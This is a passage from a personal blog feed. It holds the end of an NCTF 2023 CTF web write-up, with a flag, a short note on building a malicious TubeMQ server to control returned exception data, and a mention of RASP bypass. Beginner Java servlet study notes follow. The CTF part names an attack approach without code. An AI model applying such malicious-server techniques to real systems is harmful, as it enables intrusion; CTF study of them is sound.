class="hljs-punctuation">: </span>8<span class="language-abnf"><span class="hljs-attribute">name</span><span class="hljs-operator">=</span>test</span></code></pre></div><p><img src="/../images/NCTF2023/image-20231230023909795.png" alt="image-20231230023909795"></p><p>base64解码</p><p><code>nctf&#123;hacking_clickhouse_database_qkh7ZrPqHK2GVHky&#125;</code></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p><code>EvilMQ</code>就算了，知识点分开看看记一下，</p><p>要编写恶意 TubeMQ Server</p><div class="code-wrapper"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.inlong</span><span class="hljs-selector-class">.tubemq</span><span class="hljs-selector-class">.corerpc</span><span class="hljs-selector-class">.netty</span><span class="hljs-selector-class">.NettyRpcServer</span>.NettyServerHandler#channelRead</code></pre></div><p>控制返回的<code>throwable</code>数据</p><p>其次还有绕过RASP，学到了新的方法</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://hackforfun.feishu.cn/wiki/VkHiwiuHziepynkZuGlcp0fEnTd">NCTF 2023 Official Writeup - 飞书云文档 (feishu.cn)</a></p><p><a href="https://boogipop.com/2023/12/28/NCTF%202023%20Web%20Writeup(Post-Match)/">https://boogipop.com/2023/12/28/NCTF%202023%20Web%20Writeup(Post-Match)/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>javaweb</title>
    <link href="/2023/12/10/javaweb/"/>
    <url>/2023/12/10/javaweb/</url>
    
    <content type="html"><![CDATA[<h1 id="javaweb"><a href="#javaweb" class="headerlink" title="javaweb"></a>javaweb</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>跟着Boogipop大佬学java，这部分拖太久了，忙完下周的一个期末考试，趁其他考试还没来时赶紧学完这些开发的东西</p><p>参照Boogipop大佬的学习，学完Servlet和Listener和FIlter这部分就可以结束了</p><h2 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h2><div class="code-wrapper"><pre><code class="hljs moonscript">M2_HOME <span class="hljs-name">E</span>:\CTF学习笔记\Java\apache-maven<span class="hljs-number">-3.8</span><span class="hljs-number">.6</span>-bin\apache-maven<span class="hljs-number">-3.8</span><span class="hljs-number">.6</span>\binMAVEN_HOME <span class="hljs-name">E</span>:\CTF学习笔记\Java\apache-maven<span class="hljs-number">-3.8</span><span class="hljs-number">.6</span>-bin\apache-maven<span class="hljs-number">-3.8</span><span class="hljs-number">.6</span>在Path下添加%MAVEN_HOME%\bin</code></pre></div><p>修改conf&#x2F;setting.xml</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>aliyunmaven<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>阿里云公共仓库<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-section">&lt;localRepository&gt;</span><span class="hljs-attribute">E</span>:\CTF学习笔记\Java\apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">6</span>-bin\apache-maven-<span class="hljs-number">3</span>.<span class="hljs-number">8</span>.<span class="hljs-number">6</span>\maven-repo&lt;/localRepository&gt;</code></pre></div><h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.PrintWriter;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        resp.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);        resp.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> resp.getWriter();        writer.println(<span class="hljs-string">&quot;hahahhahahahha&quot;</span>);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;    &#125;&#125;</code></pre></div><h3 id="注册servlet"><a href="#注册servlet" class="headerlink" title="注册servlet"></a>注册servlet</h3><p>更新web.xml内容</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span><span class="hljs-string"><span class="hljs-tag">                  http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">metadata-complete</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span><span class="hljs-string"><span class="hljs-tag">                  http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">metadata-complete</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--注册servlet--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello1<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-comment">&lt;!--设置路由--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello1<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/hello1<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello1<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>*.asd<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>    //自定义以.asd结尾，*前面不加/    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>error<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>ErrorServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>error<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>          //优先级较低    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span>&lt;/web-app &gt;</code></pre></div><h2 id="ServletContent"><a href="#ServletContent" class="headerlink" title="ServletContent"></a>ServletContent</h2><p><img src="/../images/javaweb/image-20231210192026196.png" alt="image-20231210192026196"></p><p>共享数据</p><div class="code-wrapper"><pre><code class="hljs scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> void doGet(<span class="hljs-type">HttpServletRequest</span> req, <span class="hljs-type">HttpServletResponse</span> resp) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> &#123;        <span class="hljs-type">ServletContext</span> servletContext = <span class="hljs-keyword">this</span>.getServletContext();        <span class="hljs-type">String</span> user = (<span class="hljs-type">String</span>)servletContext.getAttribute(<span class="hljs-string">&quot;user&quot;</span>);        resp.getWriter().println(user);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> void doPost(<span class="hljs-type">HttpServletRequest</span> req, <span class="hljs-type">HttpServletResponse</span> resp) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> &#123;        <span class="hljs-keyword">super</span>.doPost(req, resp);    &#125;&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs scala">public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">HttpServlet</span> </span>&#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> void doGet(<span class="hljs-type">HttpServletRequest</span> req, <span class="hljs-type">HttpServletResponse</span> resp) <span class="hljs-keyword">throws</span> <span class="hljs-type">ServletException</span>, <span class="hljs-type">IOException</span> &#123;        resp.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);        resp.setCharacterEncoding(<span class="hljs-string">&quot;utf-8&quot;</span>);        <span class="hljs-type">PrintWriter</span> writer = resp.getWriter();        writer.println(<span class="hljs-string">&quot;hahahhahahahha&quot;</span>);        <span class="hljs-type">ServletContext</span> servletContext = <span class="hljs-keyword">this</span>.getServletContext();        servletContext.setAttribute(<span class="hljs-string">&quot;user&quot;</span>,<span class="hljs-string">&quot;asdsadssad&quot;</span>);    &#125;</code></pre></div><p>直接访问GetServlet对应的路由，显示为null</p><p><img src="/../images/javaweb/image-20231210192218373.png" alt="image-20231210192218373"></p><p>要先访问HelloServlet对应的路由，再访问GetServlet对应的路由即可</p><p><img src="/../images/javaweb/image-20231210192634021.png" alt="image-20231210192634021"></p><h4 id="getinitparam"><a href="#getinitparam" class="headerlink" title="getinitparam"></a>getinitparam</h4><p>web.xml中设置初始参数值</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;    <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getServletContext();    <span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (String)servletContext.getAttribute(<span class="hljs-string">&quot;user&quot;</span>);    resp.getWriter().println(user);    <span class="hljs-type">String</span> <span class="hljs-variable">cmd1</span> <span class="hljs-operator">=</span> servletContext.getInitParameter(<span class="hljs-string">&quot;cmd&quot;</span>);    resp.getWriter().println(cmd1);&#125;</code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee</span></span><span class="hljs-string"><span class="hljs-tag">                  http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span></span><span class="hljs-tag">         <span class="hljs-attr">metadata-complete</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>    <span class="hljs-comment">&lt;!--注册servlet--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello1<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>HelloServlet<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span>    <span class="hljs-comment">&lt;!--设置路由--&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>hello1<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/hello1<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">context-param</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>cmd<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>jdbc:mysql://localhost:3306/test<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">context-param</span>&gt;</span>&lt;/web-app &gt;</code></pre></div><h4 id="getRequestDispatcher"><a href="#getRequestDispatcher" class="headerlink" title="getRequestDispatcher"></a>getRequestDispatcher</h4><p>请求转发</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletContext;<span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getServletContext();        <span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (String)servletContext.getAttribute(<span class="hljs-string">&quot;user&quot;</span>);        resp.getWriter().println(user);        <span class="hljs-type">String</span> <span class="hljs-variable">cmd1</span> <span class="hljs-operator">=</span> servletContext.getInitParameter(<span class="hljs-string">&quot;cmd&quot;</span>);        resp.getWriter().println(cmd1);                servletContext.getRequestDispatcher(<span class="hljs-string">&quot;/hello1&quot;</span>).forward(req,resp);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-built_in">super</span>.doPost(req, resp);    &#125;&#125;</code></pre></div><p><img src="/../images/javaweb/image-20231210204859722.png" alt="image-20231210204859722"></p><p>转发后，其他无效，只显示<code>/hello1</code>的页面</p><p><img src="/../images/javaweb/image-20231210204324527.png" alt="image-20231210204324527"></p><h4 id="getResourceAsStream"><a href="#getResourceAsStream" class="headerlink" title="getResourceAsStream"></a>getResourceAsStream</h4><p><img src="/../images/javaweb/image-20231210220730875.png" alt="image-20231210220730875"></p><p>resources目录下的和java目录下的都会被打包到<code>classes</code>目录下</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.io.InputStream;<span class="hljs-keyword">import</span> java.util.Properties;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResourceServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-type">InputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getServletContext().getResourceAsStream(<span class="hljs-string">&quot;/WEB-INF/classes/cb.properties&quot;</span>);        <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();        properties.load(stream);        <span class="hljs-type">String</span> <span class="hljs-variable">username</span> <span class="hljs-operator">=</span> properties.getProperty(<span class="hljs-string">&quot;username&quot;</span>);        resp.getWriter().println(username);    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-built_in">super</span>.doPost(req, resp);    &#125;&#125;</code></pre></div><p>当properties文件不在resources目录下时，有可能无法导出</p><p>在pom.xml添加一段代码即可</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/resources<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.properties<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>src/main/java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">includes</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.properties<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">include</span>&gt;</span>**/*.xml<span class="hljs-tag">&lt;/<span class="hljs-name">include</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">includes</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">filtering</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">filtering</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span></code></pre></div><h2 id="response下载文件"><a href="#response下载文件" class="headerlink" title="response下载文件"></a>response下载文件</h2><p>关键在于响应的请求头<code>Content-Disposition</code>，内容为<code>attachment;filename=</code></p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.ServletOutputStream;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.io.FileInputStream;<span class="hljs-keyword">import</span> java.io.FileOutputStream;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DownServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-type">String</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:\\Users\\86136\\Pictures\\Saved Pictures\\yunchong.png&quot;</span>;                <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> path.substring(path.lastIndexOf(<span class="hljs-string">&quot;\\&quot;</span>)+<span class="hljs-number">1</span>);                resp.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>,<span class="hljs-string">&quot;attachment;filename=&quot;</span>+filename);                <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path);        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];        <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> resp.getOutputStream();        <span class="hljs-keyword">while</span> ((len = in.read(bytes))!=<span class="hljs-number">0</span>)&#123;            out.write(bytes,<span class="hljs-number">0</span>,len);        &#125;        out.close();        in.close();    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;        <span class="hljs-built_in">super</span>.doPost(req, resp);    &#125;&#125;</code></pre></div><h2 id="response-验证码"><a href="#response-验证码" class="headerlink" title="response 验证码"></a>response 验证码</h2><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.imageio.ImageIO;<span class="hljs-keyword">import</span> javax.servlet.ServletException;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<span class="hljs-keyword">import</span> java.awt.*;<span class="hljs-keyword">import</span> java.awt.image.BufferedImage;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImageServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;            <span class="hljs-comment">//内存中生成</span>        <span class="hljs-type">BufferedImage</span> <span class="hljs-variable">image</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedImage</span>(<span class="hljs-number">80</span>, <span class="hljs-number">20</span>, BufferedImage.TYPE_INT_ARGB);        <span class="hljs-type">Graphics2D</span> <span class="hljs-variable">g</span> <span class="hljs-operator">=</span> (Graphics2D) image.getGraphics();        g.setColor(Color.BLUE);        g.fillRect(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">80</span>,<span class="hljs-number">20</span>);        g.setColor(Color.BLACK);        g.setFont(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Font</span>(<span class="hljs-literal">null</span>,Font.BOLD,<span class="hljs-number">20</span>));        g.drawString(<span class="hljs-string">&quot;123456&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">20</span>);        resp.setContentType(<span class="hljs-string">&quot;image/jpg&quot;</span>);        resp.setHeader(<span class="hljs-string">&quot;Cache-Control&quot;</span>,<span class="hljs-string">&quot;no-cache&quot;</span>);        ImageIO.write(image, <span class="hljs-string">&quot;jpg&quot;</span>, resp.getOutputStream());    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;    &#125;&#125;</code></pre></div><h2 id="response-重定向"><a href="#response-重定向" class="headerlink" title="response 重定向"></a>response 重定向</h2><p>设置跳转路径时，注意加上页面设置时的虚拟映射</p><div class="code-wrapper"><pre><code class="hljs erb"><span class="language-xml">//index.jsp</span><span class="language-xml"></span><span class="language-xml">&lt;%</span><span class="language-ruby"><span class="hljs-variable">@page</span> contentType=<span class="hljs-string">&quot;text/html; charset=utf-8&quot;</span> pageEncoding=<span class="hljs-string">&quot;UTF-8&quot;</span> </span><span class="language-xml">%&gt;</span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>Hello World!<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><span class="language-xml"></span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;redirect&quot;</span> <span class="hljs-attr">method</span>=<span 